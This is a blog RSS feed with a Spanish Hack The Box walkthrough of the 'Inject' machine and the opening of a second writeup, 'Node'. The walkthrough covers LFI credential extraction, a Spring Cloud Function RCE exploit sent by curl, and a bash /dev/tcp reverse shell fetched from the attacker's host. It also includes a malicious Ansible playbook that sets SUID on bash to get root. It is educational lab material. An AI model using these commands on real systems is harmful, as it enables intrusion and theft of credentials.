<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Firtsmiracle blog de Ciberseguridad</title>
    <description>Articulos, Writeups, Htb, Programación y Noticias sobre Ciberseguridad</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Wed, 19 Jul 2023 20:40:37 +0000</pubDate>
    <lastBuildDate>Wed, 19 Jul 2023 20:40:37 +0000</lastBuildDate>
    <generator>Jekyll v3.9.0</generator>
    
      <item>
        <title>Maquina Inject - htb writeup</title>
        <description>&lt;p&gt;El dia de hoy vamos a resolver &lt;code&gt;Inject&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; una maquina &lt;code&gt;linux&lt;/code&gt; de dificultad facil, para explotar esta maquina vamos a aprovecharnos de una ruta de subida de archivos donde existe un &lt;code&gt;LFI&lt;/code&gt; y a traves de este podrenmos obtener acceso a archivos con credenciales y información para la explotación de una versión de &lt;code&gt;spring framework&lt;/code&gt; que nos otorgara &lt;code&gt;RCE&lt;/code&gt; y finalmente para elevar nuestros privilegios abusaremos de una &lt;code&gt;cron job&lt;/code&gt; para crearnos un archivo malicioso &lt;code&gt;ansible playbook&lt;/code&gt;, manipulando los permisos de la &lt;code&gt;bash&lt;/code&gt; y asi convertirnos en el usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Maquina curiosa asi que vamos a darle!.&lt;/p&gt;

&lt;p&gt;Vamos a comenzar como de costumbre creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Inject
❯ ls

 Inject
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeracion&quot;&gt;ENUMERACION &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.11.204
PING 10.10.11.204 (10.10.11.204) 56(84) bytes of data.
64 bytes from 10.10.11.204: icmp_seq=1 ttl=63 time=125 ms

--- 10.10.11.204 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 124.537/124.537/124.537/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;63&lt;/code&gt; y por proximidad seria correspondiente a una maquina &lt;code&gt;linux&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;ESCANEO DE PUERTOS&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.204 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-19 18:09 GMT
Initiating SYN Stealth Scan at 18:09
Scanning 10.10.11.204 [65535 ports]
Discovered open port 8080/tcp on 10.10.11.204
Discovered open port 22/tcp on 10.10.11.204
Completed SYN Stealth Scan at 18:09, 15.98s elapsed (65535 total ports)
Nmap scan report for 10.10.11.204
Host is up, received user-set (0.13s latency).
Scanned at 2023-07-19 18:09:29 GMT for 16s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 16.10 seconds
           Raw packets sent: 78704 (3.463MB) | Rcvd: 78677 (3.147MB)
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;ESCANEO DE VERSION Y SERVICIOS&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p22,8080 10.10.11.204 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-19 18:10 GMT
Nmap scan report for 10.10.11.204
Host is up (0.15s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ca:f1:0c:51:5a:59:62:77:f0:a8:0c:5c:7c:8d:da:f8 (RSA)
|   256 d5:1c:81:c9:7b:07:6b:1c:c1:b4:29:25:4b:52:21:9f (ECDSA)
|_  256 db:1d:8c:eb:94:72:b0:d3:ed:44:b9:6c:93:a7:f9:1d (ED25519)
8080/tcp open  nagios-nsca Nagios NSCA
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.07 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Visulizamos información interesante de los puertos escaneados:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;SSH&lt;/td&gt;
      &lt;td&gt;OpenSSH 8.2p1&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;8080&lt;/td&gt;
      &lt;td&gt;HTTP&lt;/td&gt;
      &lt;td&gt;nagios-nsca Nagios NSCA&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;explotación&quot;&gt;EXPLOTACION &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Comenzamos usando &lt;code&gt;whatweb&lt;/code&gt;, para determinar las tecnologias que esta usando el servicio web.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://10.10.11.204:8080
http://10.10.11.204:8080 [200 OK] Bootstrap, Content-Language[en-US], Country[RESERVED][ZZ], Frame, HTML5, IP[10.10.11.204], Title[Home], YouTube
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;La herramienta no nos reporta mucha información, asi que vamos a proceder a abrir el servicio con el navegador para visualizar el servicio.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Inject/inj1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Observamos que existe una sección de login y registro pero que esta actualmente en construcción.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Inject/inj2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En la pagina principal tambien podemos ver una sección de &lt;code&gt;upload&lt;/code&gt;, la cual nos redirige a una ruta de subida de archivos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Inject/inj3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vamos a tratar de subir un archivo simple con extensión &lt;code&gt;txt&lt;/code&gt; y vamos a interceptar la petición con &lt;code&gt;burpsuite&lt;/code&gt; para realizar pruebas.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Inject/inj4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Interceptamos la petición y la mandamos al &lt;code&gt;Repeater&lt;/code&gt;, y vemos como respuesta que solo podemos subir imagenes.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Inject/inj5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si ahora alteramos la petición y cambiamos la extensión del archivo nos muestra un mensaje de subida correcta del archivo con su respectiva ruta.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Inject/inj6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si ahora desde consola intentamos apuntar a la ruta, listando un directorio atras, obtenemos un &lt;code&gt;LFI&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ curl -s -X GET &quot;http://10.10.11.204:8080/show_image?img=..&quot;
java
resources
uploads
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora podemos listar los usuarios de el archivo &lt;code&gt;/etc/passwd&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ curl -s -X GET &quot;http://10.10.11.204:8080/show_image?img=../../../../../../etc/passwd&quot; | grep &quot;sh$&quot;
root:x:0:0:root:/root:/bin/bash
frank:x:1000:1000:frank:/home/frank:/bin/bash
phil:x:1001:1001::/home/phil:/bin/bash
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si ahora tratamos de listar el contenido del directorio de los usuarios, observamos un archivo &lt;code&gt;settings.xml&lt;/code&gt; en el directorio del usuario &lt;code&gt;frank&lt;/code&gt;. Vamos a exportar el contenido y dentro obtenemos unas credenciales del usuario &lt;code&gt;phill&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ curl -s -X GET &quot;http://10.10.11.204:8080/show_image?img=../../../../../../home/frank/.m2&quot;
settings.xml
❯ curl -s -X GET &quot;http://10.10.11.204:8080/show_image?img=../../../../../../home/frank/.m2/settings.xml&quot; -o settings.xml
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-xml&quot;&gt;❯ cat settings.xml
&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;settings xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
        xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&amp;gt;
  &amp;lt;servers&amp;gt;
    &amp;lt;server&amp;gt;
      &amp;lt;id&amp;gt;Inject&amp;lt;/id&amp;gt;
      &amp;lt;username&amp;gt;phil&amp;lt;/username&amp;gt;
      &amp;lt;password&amp;gt;DocPhillovestoInject123&amp;lt;/password&amp;gt;
      &amp;lt;privateKey&amp;gt;${user.home}/.ssh/id_dsa&amp;lt;/privateKey&amp;gt;
      &amp;lt;filePermissions&amp;gt;660&amp;lt;/filePermissions&amp;gt;
      &amp;lt;directoryPermissions&amp;gt;660&amp;lt;/directoryPermissions&amp;gt;
      &amp;lt;configuration&amp;gt;&amp;lt;/configuration&amp;gt;
    &amp;lt;/server&amp;gt;
  &amp;lt;/servers&amp;gt;
&amp;lt;/settings&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si tratamos de contectarnos por el servicio &lt;code&gt;ssh&lt;/code&gt;, las credenciales no son correctas, y si ahora listamos dos directorios atras, encontramos otro archivo &lt;code&gt;pom.xml&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ curl -s -X GET &quot;http://10.10.11.204:8080/show_image?img=../../../&quot;
.classpath
.DS_Store
.idea
.project
.settings
HELP.md
mvnw
mvnw.cmd
pom.xml
src
target
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si vemos el contenido vemos que esta relacionado a &lt;code&gt;spring framework&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-xml&quot;&gt;❯ cat pom.xml
&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
	xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&amp;gt;
	&amp;lt;modelVersion&amp;gt;4.0.0&amp;lt;/modelVersion&amp;gt;
	&amp;lt;parent&amp;gt;
		&amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt;
		&amp;lt;artifactId&amp;gt;spring-boot-starter-parent&amp;lt;/artifactId&amp;gt;
		&amp;lt;version&amp;gt;2.6.5&amp;lt;/version&amp;gt;
		&amp;lt;relativePath/&amp;gt; &amp;lt;!-- lookup parent from repository --&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;Spring Framework : Spring es un framework para el desarrollo de aplicaciones y contenedor de inversión de control, de código abierto para la plataforma Java.​ La primera versión fue escrita por Rod Johnson, quien lo lanzó junto a la publicación de su libro Expert One-on-One J2EE Design and Development.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Si buscamos un poco encontramos un exploit que nos otorga &lt;code&gt;RCE&lt;/code&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/J0ey17/CVE-2022-22963_Reverse-Shell-Exploit&quot;&gt;https://github.com/J0ey17/CVE-2022-22963_Reverse-Shell-Exploit&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Si abrimos el explit, observamos que este se aprovecha de una ruta &lt;code&gt;functionRouter&lt;/code&gt; y envia un payload diseñado a traves de los headers donde ejecuta finalmente un comando.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Inject/inj7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como no es tan complejo su explotación podemos hacerlo manualmente incoporando los parametros requeridos con el propio &lt;code&gt;curl&lt;/code&gt;. Nos mandamos una traza a nuestra maquina host.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ curl -s -X POST &quot;http://10.10.11.204:8080/functionRouter&quot; -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;ping -c 1 10.10.16.2&quot;)' -d '.'
{&quot;timestamp&quot;:&quot;2023-07-19T18:56:07.739+00:00&quot;,&quot;status&quot;:500,&quot;error&quot;:&quot;Internal Server Error&quot;,&quot;message&quot;:&quot;EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String&quot;,&quot;path&quot;:&quot;/functionRouter&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y recibimos la petición.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
18:56:22.791783 IP 10.10.11.204 &amp;gt; 10.10.16.2: ICMP echo request, id 2, seq 1, length 64
18:56:22.791819 IP 10.10.16.2 &amp;gt; 10.10.11.204: ICMP echo reply, id 2, seq 1, length 64
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Para ganar acceso vamos a crearnos un archivo en bash de nombre &lt;code&gt;index.html&lt;/code&gt; que nos otorgue una reverse shell, el cual nos compartiremos y almancenaremos en la maquina victima para posteriormente ejecutarlo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ cat index.html
#!/bin/bash

bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.16.2/443 0&amp;gt;&amp;amp;1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Realizamos la petición.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ curl -s -X POST &quot;http://10.10.11.204:8080/functionRouter&quot; -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;curl 10.10.16.2 -o /tmp/reverse&quot;)' -d '.'
{&quot;timestamp&quot;:&quot;2023-07-19T18:58:54.291+00:00&quot;,&quot;status&quot;:500,&quot;error&quot;:&quot;Internal Server Error&quot;,&quot;message&quot;:&quot;EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String&quot;,&quot;path&quot;:&quot;/functionRouter&quot;}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Recibimos la petición en nuestro servicio.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.204 - - [19/Jul/2023 18:59:09] &quot;GET / HTTP/1.1&quot; 200 -
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora solo debemos ejecutarlo y ponermos en escucha con &lt;code&gt;ntcat&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ curl -s -X POST &quot;http://10.10.11.204:8080/functionRouter&quot; -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;bash /tmp/reverse&quot;)' -d '.'
{&quot;timestamp&quot;:&quot;2023-07-19T19:05:11.598+00:00&quot;,&quot;status&quot;:500,&quot;error&quot;:&quot;Internal Server Error&quot;,&quot;message&quot;:&quot;EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String&quot;,&quot;path&quot;:&quot;/functionRouter&quot;}#                        
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Obtenemos acceso como el usuario &lt;code&gt;frank&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.11.204.
Ncat: Connection from 10.10.11.204:60530.
bash: cannot set terminal process group (827): Inappropriate ioctl for device
bash: no job control in this shell
frank@inject:/$ whoami
whoami
frank
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como siempre hacemos el tratamiento para obtener una full &lt;code&gt;tty&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;frank@inject:/$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
frank@inject:/$ ^Z
zsh: suspended  ncat -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  ncat -nlvp 443
                                reset xterm
frank@inject:/$ export TERM=xterm
frank@inject:/$ export SHELL=bash
frank@inject:/$ stty rows 45 columns 184
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si ahora buscamos la flag y intentamos leerla vemos que no contamos con permisos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;frank@inject:/$ find / -name user.txt 2&amp;gt;/dev/null
/home/phil/user.txt
^C
frank@inject:/$ cat /home/phil/user.txt
cat: /home/phil/user.txt: Permission denied
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Recordemos que antes obtuvimos unas credenciales del usuario &lt;code&gt;phil&lt;/code&gt;, asi que vamos a tratar de usar esa contraseña y migrar al usuario &lt;code&gt;phil&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;frank@inject:/$ su phil
Password: 
phil@inject:/$ whoami
phil
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ahora podemos leer la primera flag &lt;code&gt;user.txt&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;phil@inject:/$ cd /home/phil/
phil@inject:~$ cat user.txt 
7b309ae956b0821aef61ef39aa5d4f7e
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;ELEVACION DE PRIVILEGIOS &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Ya que somos el usuario &lt;code&gt;phil&lt;/code&gt;, listamos los grupos a los cuales pertenecemos y vemos uno correspondiente a &lt;code&gt;staff&lt;/code&gt;. Seguidamente listamos los recuros a los que tenemos acceso.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;phil@inject:~$ id
uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)
phil@inject:~$ find / -group staff 2&amp;gt;/dev/null
/opt/automation/tasks
/root
/var/local
/usr/local/lib/python3.8
/usr/local/lib/python3.8/dist-packages
/usr/local/lib/python3.8/dist-packages/ansible_parallel.py
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/LICENSE
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/RECORD
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/entry_points.txt
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/WHEEL
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/METADATA
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/top_level.txt
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/INSTALLER
/usr/local/lib/python3.8/dist-packages/__pycache__
/usr/local/lib/python3.8/dist-packages/__pycache__/ansible_parallel.cpython-38.pyc
/usr/local/share/fonts
/usr/local/share/fonts/.uuid
phil@inject:~$ /opt/automation/tasks
bash: /opt/automation/tasks: Is a directory
phil@inject:~$ ls -l /opt/automation/tasks
total 4
-rw-r--r-- 1 root root 150 Jul 19 20:02 playbook_1.yml
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Observamos un &lt;code&gt;playbook.yml&lt;/code&gt;, si investigamos un poco encotramos que esta relacionado a ansible.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Un playbook de Ansible® es un plano técnico de las tareas de automatización, las cuales son acciones complejas de TI cuya ejecución se lleva a cabo con muy poca intervención humana o sin ella.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Vamos a crearnos un procmon, para listar los procesos que se estan ejecutando a intervalos regulares de tiempo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;phil@inject:/tmp$ cat procmon.sh
#!/bin/bash

old_process=$(ps -eo user, command)

while true; do
	new_process=$(ps -eo user, command)
	diff &amp;lt;(echo &quot;$old_process&quot;) &amp;lt;(echo &quot;$new_process&quot;) | grep &quot;[\&amp;gt;\&amp;lt;]&quot; | grep -vE &quot;procmon|kworker|command&quot;
	old_process=$new_process
done
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ejecutamos el script y obervamos que el usuario &lt;code&gt;root&lt;/code&gt; esta ejecutando un borrado de todo lo que se encuentra en el directorio &lt;code&gt;tasks&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;phil@inject:/tmp$ ./procmon.sh 
&amp;lt; root     /usr/sbin/CRON -f
&amp;lt; root     /bin/sh -c sleep 10 &amp;amp;&amp;amp; /usr/bin/rm -rf /opt/automation/tasks/* &amp;amp;&amp;amp; /usr/bin/cp /root/playbook_1.yml /opt/automation/tasks/
&amp;lt; root     sleep 10
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo que podemos hacer es crearnos un archivo similar a &lt;code&gt;playbook_1.yml&lt;/code&gt; para insertar un comando y al ejecutar la tarea el usuario &lt;code&gt;root&lt;/code&gt;, podemos tratar de cambiar los permisos de la &lt;code&gt;bash&lt;/code&gt; otorgandole &lt;code&gt;suid&lt;/code&gt; y asi poder convertirnos en el usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Para ello primero debemos crearnos un archivo &lt;code&gt;reverse.yml&lt;/code&gt; malicioso que nos ejecute un comando, es simple pero puedes guiarte de la documentación para entenderlo mejor.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://docs.ansible.com/ansible/latest/collections/ansible/builtin/command_module.html&quot;&gt;https://docs.ansible.com/ansible/latest/collections/ansible/builtin/command_module.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;phil@inject:/opt/automation/tasks$ cat reverse.yml 
- hosts: localhost
  tasks:
  - name: suid to bash
    ansible.builtin.shell: chmod u+s /bin/bash
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora solo debemos esperar a que se ejecute la tarea y podemos ver que la &lt;code&gt;bash&lt;/code&gt; ahora cuenta con el privilegio &lt;code&gt;suid&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;phil@inject:/opt/automation/tasks$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo que nos queda ahora es convertirnos en el usuario &lt;code&gt;root&lt;/code&gt;, dirigirnos a su directorio personal y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;phil@inject:/opt/automation/tasks$ bash -p
bash-5.0# whoami
root
bash-5.0# cd /root
bash-5.0# cat root.txt 
26521e5fb779f8e62fa4d068175a3b5a
&lt;/code&gt;&lt;/pre&gt;
</description>
        <pubDate>Wed, 19 Jul 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Inject</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Inject</guid>
        
        <category>Web Enumeation</category>
        
        <category>Local File Inclusion</category>
        
        <category>Information Leaked</category>
        
        <category>Spring CLoud Explotation</category>
        
        <category>Abusing Cron Job</category>
        
        <category>Malicius Ansible Playbook</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
      <item>
        <title>Maquina Node - htb writeup</title>
        <description>&lt;p&gt;El dia de hoy vamos a resolver &lt;code&gt;Node&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; una maquina &lt;code&gt;linux&lt;/code&gt; de dificultad media, para poder comprometer la maquina nos aprovecharemos la informacion lekeada del servicio expuesta en la &lt;code&gt;api&lt;/code&gt; que nos otorgara credenciales para conectarnos al servicio, donde descargaremos un backup comprimido con información para poder ingresar al sistema, despues aprovecharemos de una inyeccion a una task de &lt;code&gt;mongodb&lt;/code&gt; donde a traves de un campo obtendremos ejecución remota de comandos &lt;code&gt;rce&lt;/code&gt; y finalmente mediante un binario &lt;code&gt;suid&lt;/code&gt; podremos leeer la flag del usuario &lt;code&gt;root&lt;/code&gt;. Ademas alternivamente vamos a ganar acceso al sistema explotando un &lt;code&gt;buffer overflow&lt;/code&gt; en el binario &lt;code&gt;suid&lt;/code&gt; a traves de &lt;code&gt;ret2libc&lt;/code&gt; y ganando acceso al sistema como el usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Esta maquina es divertida asi que a darle!.&lt;/p&gt;

